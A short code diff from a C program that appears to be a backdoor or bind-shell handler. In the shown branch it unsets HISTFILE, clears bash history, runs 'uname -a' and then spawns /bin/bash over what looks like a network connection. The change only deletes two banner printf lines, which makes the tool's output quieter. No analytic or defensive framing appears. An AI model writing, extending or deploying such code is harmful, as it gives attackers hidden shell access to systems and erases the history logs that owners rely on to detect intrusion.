@@ -92,9 +92,7 @@ int main()
 					system("export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin");
 					system("unset HISTFILE");
 					system("bash -c 'history -c'");
-					printf("\n=========================\n");
 					system("uname -a");
-					printf("\n=========================\n");
 					system("/bin/bash");
 					close(result);	
 				}
